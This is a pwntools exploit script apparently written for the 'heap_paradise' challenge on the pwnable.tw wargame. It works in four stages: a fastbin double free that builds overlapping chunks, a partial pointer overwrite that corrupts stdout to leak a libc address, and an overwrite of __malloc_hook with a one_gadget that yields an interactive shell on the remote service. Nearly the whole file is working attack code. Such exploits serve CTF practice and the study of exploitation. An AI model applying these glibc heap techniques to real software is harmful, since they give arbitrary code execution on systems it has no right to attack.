from pwn import *

# context.log_level="debug"
def alloc(size, data):
    p.sendlineafter(b'You Choice:', b'1')
    p.sendlineafter(b'Size :', str(size).encode())
    p.sendafter(b'Data :', data)

def free(idx):
    p.sendlineafter(b'You Choice:', b'2')
    p.sendlineafter(b'Index :', str(idx).encode())


elf = ELF("heap_paradise")
libc = ELF("libc_64.so.6")
p = remote('chall.pwnable.tw', 10308)
# p = process('./heap_paradise', env={'LD_PRELOAD': './libc_64.so.6'})

with log.progress("Stage 1: Producing 0x70 fastbin") as l:
	alloc(0x40, b'a' * 0x38 + p64(0x51))
	alloc(0x40, (p64(0) + p64(0x21)) * 4)
	alloc(0x60, (p64(0) + p64(0x21)) * 6)

	free(0)
	free(1)
	free(0)

	alloc(0x40, b'\x40')
	alloc(0x40, b'b')
	alloc(0x40, b'a')
	alloc(0x40, p64(0) + p64(0x71))

	# Produce 0x70 fastbin
	free(1)
	l.success()

with log.progress("Stage 2: Producing unsorted bin overlapping with 0x70 fastbin") as l:
	# Produce unsorted bin overlapping with 0x70 fastbin
	free(6)
	alloc(0x40, p64(0) + p64(0x91))

	free(1)
	l.success()
# Now we have a unsorted bin, fd & bk are libc address.
# Partially overwrite this address to address before stdout (Must meet size constraint, of course)

with log.progress("Stage 3: Leaking libc address") as l:
	log.info("Exploit will success with 1/16 prob")
	free(6)
	alloc(0x40, p64(0) + p64(0x71) + b'\xdd\x95')

		# Exploit will success with 1/16 prob.

		# Overwrite stdout, leak libc address
	alloc(0x60, b'a')
	alloc(0x60, b'b' * 0x33 + p64(0xfbad1800) + p64(0) + p64(0) + p64(0) + b'\x88')

	leak=u64(p.recv(8))
	libc = leak - 0x3c38e0

	log.info(f'leak: {hex(leak)}')

		# Overwrite hook
	one_gadget_offset = [0x45216, 0x4526a, 0xef6c4, 0xf0567]
	malloc_hook = libc + 0x3c3b10
	one_gadget = libc + one_gadget_offset[3]
	log.info(f"malloc_hook: {hex(malloc_hook)}")
	log.info(f'one_gadget: {hex(one_gadget)}')
	l.success(hex(libc))


with log.progress("Stage 4: Overwriting malloc_hook") as l:
	free(1)
	free(2)
	free(1)

	alloc(0x60, p64(malloc_hook - 0x23))
	alloc(0x60, b'a')
	alloc(0x60, b'a')
	alloc(0x60, b'a' * 0x13 + p64(one_gadget))

	p.sendlineafter(b'You Choice:', b'1')
	p.sendlineafter(b'Size :', b'1')
	l.success()

p.interactive()